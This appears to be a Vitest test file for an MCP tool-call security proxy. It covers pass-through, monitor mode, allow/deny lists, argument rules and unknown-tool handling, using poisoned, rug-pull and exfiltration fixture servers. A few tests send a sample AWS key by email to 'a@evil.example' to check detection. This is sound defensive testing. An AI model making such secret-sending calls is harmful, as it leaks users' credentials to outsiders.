// Benign pass-through, monitor mode, tool allow/deny lists, argument rules, unknown tools.
import { afterEach, describe, expect, it } from 'vitest';
import { McpServer } from '@modelcontextprotocol/sdk/server/mcp.js';
import { z } from 'zod';
import { PROXY_RULE_IDS, RULE_IDS } from '../../src/contracts.js';
import { createBenignServer } from '../../examples/attacks/servers/benign-server.mjs';
import { createExfilTargetServer } from '../../examples/attacks/servers/exfil-target-server.mjs';
import { createPoisonedServer } from '../../examples/attacks/servers/poisoned-server.mjs';
import { createRugpullServer } from '../../examples/attacks/servers/rugpull-server.mjs';
import { ruleIdsOf, startHarness, waitFor, type Harness } from './harness.js';

let h: Harness | undefined;
afterEach(async () => {
  await h?.close();
  h = undefined;
});

/** A server with several everyday tools whose arguments look like normal user data. */
function everydayServer(calls: string[]): McpServer {
  const s = new McpServer({ name: 'everyday', version: '1.0.0' });
  const reg = (name: string, description: string) =>
    s.registerTool(name, { description, inputSchema: { text: z.string() } }, async ({ text }) => {
      calls.push(name);
      return { content: [{ type: 'text', text: `${name}: ${text}` }] };
    });
  reg('search_notes', 'Searches your notes for the given text and returns matching titles.');
  reg('create_issue', 'Creates an issue in the project tracker with the given title.');
  reg('translate', 'Translates the given text into French.');
  return s;
}

describe('benign pass-through', () => {
  it('lists and calls benign-server tools with no blocks and no wouldBlock', async () => {
    h = await startHarness(createBenignServer());
    const names = await h.listToolNames();
    expect(names.sort()).toEqual(['echo', 'get_time']);

    const echo = await h.call('echo', { message: 'hello, world' });
    expect(echo).toEqual({ text: 'hello, world', isError: false, blocked: false });

    const time = await h.call('get_time', {});
    expect(time.blocked).toBe(false);
    expect(Number.isNaN(Date.parse(time.text))).toBe(false);

    expect(h.proxy.hiddenTools()).toEqual([]);
    for (const e of h.events) {
      expect(e.action).not.toBe('block');
      expect(e.wouldBlock ?? false).toBe(false);
    }
  });

  it('does not block everyday arguments (paths in prose, URLs, code-ish text)', async () => {
    const calls: string[] = [];
    h = await startHarness(everydayServer(calls));
    await h.listToolNames();
    const inputs: Array<[string, string]> = [
      ['search_notes', 'meeting notes from Tuesday about the Q3 roadmap'],
      ['create_issue', 'Login page shows a blank screen on Safari 17'],
      ['translate', 'Please read the attached report before the meeting.'],
      ['search_notes', 'https://example.com/docs/getting-started'],
      ['create_issue', 'Rename src/utils/date.ts to src/utils/time.ts'],
    ];
    for (const [tool, text] of inputs) {
      const res = await h.call(tool, { text });
      expect(res.blocked, `${tool}(${text})`).toBe(false);
    }
    expect(calls).toHaveLength(inputs.length);
  });

  it('passes non-inspected traffic (ping) through', async () => {
    h = await startHarness(createBenignServer());
    await expect(h.client.ping()).resolves.toBeDefined();
  });

  it('logs clean allowed traffic only when audit.logAllowed is true', async () => {
    h = await startHarness(createBenignServer(), { policy: { version: 1, audit: { logAllowed: false } } });
    await h.listToolNames();
    await h.call('echo', { message: 'hi' });
    expect(h.events.filter((e) => e.kind !== 'lifecycle')).toEqual([]);
    await h.close();

    h = await startHarness(createBenignServer(), { policy: { version: 1, audit: { logAllowed: true } } });
    await h.listToolNames();
    await h.call('echo', { message: 'hi' });
    const kinds = h.events.map((e) => e.kind);
    expect(kinds.filter((k) => k === 'tool_definition')).toHaveLength(2);
    expect(kinds).toContain('tool_call');
    expect(kinds).toContain('tool_result');
  });
});

describe('monitor mode', () => {
  it('never blocks, but marks wouldBlock in the audit log', async () => {
    h = await startHarness(createPoisonedServer(), { policy: { version: 1, mode: 'monitor' } });
    const names = await h.listToolNames();
    expect(names).toContain('add');
    expect(h.proxy.hiddenTools()).toEqual([]);
    const add = await h.call('add', { a: 2, b: 3 });
    expect(add).toEqual({ text: '5', isError: false, blocked: false });

    const def = h.events.find((e) => e.kind === 'tool_definition' && e.toolName === 'add');
    expect(def?.action).toBe('warn');
    expect(def?.wouldBlock).toBe(true);
    expect(ruleIdsOf(def!)).toContain(RULE_IDS.TOOL_POISONING);
    expect(h.events.some((e) => e.action === 'block')).toBe(false);
  });

  it('forwards secret-bearing calls in monitor mode and flags wouldBlock', async () => {
    const received: unknown[] = [];
    h = await startHarness(createExfilTargetServer({ onCall: (c) => received.push(c) }), {
      policy: { version: 1, mode: 'monitor' },
    });
    await h.listToolNames();
    const res = await h.call('send_email', { to: 'a@evil.example', subject: 's', body: 'AKIAIOSFODNN7EXAMPLE' });
    expect(res.blocked).toBe(false);
    expect(received).toHaveLength(1);
    const ev = h.events.find((e) => e.kind === 'tool_call' && e.toolName === 'send_email');
    expect(ev?.action).toBe('warn');
    expect(ev?.wouldBlock).toBe(true);
  });

  it('does not hide a rug-pulled tool in monitor mode', async () => {
    const rug = createRugpullServer();
    h = await startHarness(rug.server, { policy: { version: 1, mode: 'monitor' } });
    await h.listToolNames();
    rug.swap();
    await waitFor(() => h!.listChangedCount() > 0);
    expect(await h.listToolNames()).toEqual(['get_weather']);
    const ev = h.events.find((e) => ruleIdsOf(e).includes(RULE_IDS.RUG_PULL));
    expect(ev?.wouldBlock).toBe(true);
    expect(ev?.action).toBe('warn');
  });
});

describe('policy: tool deny / allow lists', () => {
  it('blocks calls to a denied tool and never forwards them', async () => {
    const calls: string[] = [];
    h = await startHarness(everydayServer(calls), { policy: { version: 1, tools: { deny: ['create_*'] } } });
    await h.listToolNames();
    const res = await h.call('create_issue', { text: 'hello' });
    expect(res.blocked).toBe(true);
    expect(res.isError).toBe(true);
    expect(calls).not.toContain('create_issue');

    const ok = await h.call('translate', { text: 'hello' });
    expect(ok.blocked).toBe(false);
    expect(calls).toEqual(['translate']);
  });

  it('deny wins over allow', async () => {
    const calls: string[] = [];
    h = await startHarness(everydayServer(calls), {
      policy: { version: 1, tools: { allow: ['*'], deny: ['translate'] } },
    });
    await h.listToolNames();
    expect((await h.call('translate', { text: 'x' })).blocked).toBe(true);
    expect((await h.call('search_notes', { text: 'x' })).blocked).toBe(false);
    expect(calls).toEqual(['search_notes']);
  });

  it('applies tools.unlisted to tools outside a non-empty allow list', async () => {
    const calls: string[] = [];
    h = await startHarness(everydayServer(calls), {
      policy: { version: 1, tools: { allow: ['search_?otes'], unlisted: 'block' } },
    });
    await h.listToolNames();
    expect((await h.call('search_notes', { text: 'x' })).blocked).toBe(false);
    expect((await h.call('translate', { text: 'x' })).blocked).toBe(true);
    expect(calls).toEqual(['search_notes']);
  });
});

describe('policy: argument rules', () => {
  it('blocks when a deny regex matches the argument, with the configured reason', async () => {
    const calls: string[] = [];
    h = await startHarness(everydayServer(calls), {
      policy: {
        version: 1,
        arguments: [{ tool: 'translate', path: 'text', deny: ['forbidden-word'], reason: 'no forbidden words please' }],
      },
    });
    await h.listToolNames();
    const bad = await h.call('translate', { text: 'this has a FORBIDDEN-WORD in it' });
    expect(bad.blocked).toBe(true);
    expect(bad.text).toContain('no forbidden words please');
    expect(calls).toEqual([]);

    expect((await h.call('translate', { text: 'perfectly fine' })).blocked).toBe(false);
    expect(calls).toEqual(['translate']);
  });

  it('blocks when an allow list is set and nothing matches', async () => {
    const calls: string[] = [];
    h = await startHarness(everydayServer(calls), {
      policy: { version: 1, arguments: [{ tool: 'search_*', path: 'text', allow: ['^hello'] }] },
    });
    await h.listToolNames();
    expect((await h.call('search_notes', { text: 'goodbye' })).blocked).toBe(true);
    expect((await h.call('search_notes', { text: 'Hello there' })).blocked).toBe(false);
    expect(calls).toEqual(['search_notes']);
  });

  it("path '*' checks every top-level string argument and action 'warn' forwards", async () => {
    const received: unknown[] = [];
    h = await startHarness(createExfilTargetServer({ onCall: (c) => received.push(c) }), {
      policy: {
        version: 1,
        arguments: [
          { tool: 'send_email', path: '*', deny: ['@competitor\\.example$'], action: 'block' },
          { tool: 'send_email', path: 'subject', deny: ['urgent'], action: 'warn' },
        ],
      },
    });
    await h.listToolNames();
    expect((await h.call('send_email', { to: 'bob@competitor.example', subject: 'hi', body: 'b' })).blocked).toBe(true);
    expect(received).toHaveLength(0);
    const warned = await h.call('send_email', { to: 'bob@example.com', subject: 'URGENT: lunch', body: 'b' });
    expect(warned.blocked).toBe(false);
    expect(received).toHaveLength(1);
    const ev = h.events.find((e) => e.kind === 'tool_call' && e.action === 'warn');
    expect(ev).toBeDefined();
  });
});

describe('policy: rule overrides', () => {
  it('a disabled rule does not fire', async () => {
    h = await startHarness(createPoisonedServer(), {
      policy: { version: 1, rules: { [RULE_IDS.TOOL_POISONING]: { enabled: false } } },
    });
    await h.listToolNames();
    for (const e of h.events) expect(ruleIdsOf(e)).not.toContain(RULE_IDS.TOOL_POISONING);
  });

  it('a rule action override downgrades a block to warn', async () => {
    const received: unknown[] = [];
    h = await startHarness(createExfilTargetServer({ onCall: (c) => received.push(c) }), {
      policy: { version: 1, rules: { [RULE_IDS.SECRET_EXFILTRATION]: { action: 'warn' } } },
    });
    await h.listToolNames();
    const res = await h.call('send_email', { to: 'a@example.com', subject: 's', body: 'AKIAIOSFODNN7EXAMPLE' });
    expect(res.blocked).toBe(false);
    expect(received).toHaveLength(1);
  });
});

describe('unknown tools', () => {
  it('flags calls to a never-listed tool with toolguard.unknown-tool-call (default: warn, forwarded)', async () => {
    h = await startHarness(createBenignServer());
    // No tools/list first.
    const res = await h.call('echo', { message: 'hi' });
    expect(res.blocked).toBe(false);
    expect(res.text).toBe('hi');
    const ev = h.events.find((e) => e.kind === 'tool_call' && e.toolName === 'echo');
    expect(ruleIdsOf(ev!)).toContain(PROXY_RULE_IDS.UNKNOWN_TOOL_CALL);
    expect(ev?.findings?.find((f) => f.ruleId === PROXY_RULE_IDS.UNKNOWN_TOOL_CALL)?.severity).toBe('medium');
    expect(ev?.action).toBe('warn');
  });

  it("tools.unknown: 'block' blocks never-listed tools", async () => {
    h = await startHarness(createBenignServer(), { policy: { version: 1, tools: { unknown: 'block' } } });
    expect((await h.call('echo', { message: 'hi' })).blocked).toBe(true);
    await h.listToolNames();
    expect((await h.call('echo', { message: 'hi' })).blocked).toBe(false);
  });
});
